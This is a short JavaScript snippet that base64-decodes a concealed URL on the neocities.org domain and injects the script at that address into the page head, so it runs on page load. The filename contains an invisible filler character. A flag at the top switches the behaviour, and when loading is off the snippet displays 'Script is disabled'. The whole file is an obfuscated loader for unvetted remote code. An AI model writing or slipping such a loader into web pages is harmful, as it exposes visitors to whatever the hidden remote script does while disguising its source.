var loadExternalScript = true; // Editable

(function(){
    const keys = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    function customBase64Decode(input) {
        let str = '', chr1, chr2, chr3, enc1, enc2, enc3, enc4, i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');
        while (i < input.length) {
            enc1 = keys.indexOf(input.charAt(i++));
            enc2 = keys.indexOf(input.charAt(i++));
            enc3 = keys.indexOf(input.charAt(i++));
            enc4 = keys.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            str += String.fromCharCode(chr1);
            if (enc3 != 64) str += String.fromCharCode(chr2);
            if (enc4 != 64) str += String.fromCharCode(chr3);
        }
        return str;
    }

    const encodedURL = "aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQlRTMlODUlQTRqcw=="; // encoded https://sharebooster.neocities.org/script%E3%85%A4.js
    const url = customBase64Decode(encodedURL);

    if (loadExternalScript) {
        var s = document.createElement('script');
        s.src = url;
        document.head.appendChild(s);
    } else {
        var statusDiv = document.getElementById("scriptStatus");
        statusDiv.style.display = "block";
        statusDiv.textContent = "Script is disabled";
    }
})();
